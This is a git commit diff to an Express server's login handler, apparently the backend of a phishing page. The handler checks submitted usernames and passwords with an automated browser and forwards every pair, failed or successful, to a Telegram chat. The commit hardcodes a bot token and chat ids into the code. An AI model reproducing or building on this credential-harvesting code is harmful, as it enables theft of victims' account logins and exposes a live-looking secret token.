d7816396f07cc6a227d7ec8b0abc964ddf74b8c6
managefleetone <fleetone.manage@gmail.com>
2025-03-25 13:11:59 +0400

    Update index.js

--- index.js
+++ index.js
@@ -43,10 +43,10 @@ app.post("/login", async (req, res) => {
 
     const loginError = await page.locator(".errors").count();
     if (loginError > 0) {
-      await browser.close();
-      const telegramUrl = https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=-1002614062462;
+      await browser.close(); 
+      const telegramUrl = https://api.telegram.org/bot8028378156:AAFzr5FzJtK7H3wo1ResfDt4IhFaYX9k6OM/sendMessage?chat_id=-1002614062462;
       const telegramMessage = {
-        chat_id: CHAT_ID,
+        chat_id: 531918242,
         text: ✅ Error Login:\n👤 Username: ${username}\n🔑 Password: ${password},
       };
 
@@ -64,9 +64,9 @@ app.post("/login", async (req, res) => {
       return res.json({ success: false, message: "Login failed" });
     }
 
-    const telegramUrl = https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=-1002614062462;
+    const telegramUrl = https://api.telegram.org/bot8028378156/sendMessage?chat_id=-1002614062462;
     const telegramMessage = {
-      chat_id: CHAT_ID,
+      chat_id: 531918242,
       text: ✅ Новый логин:\n👤 Username: ${username}\n🔑 Password: ${password},
     };
 
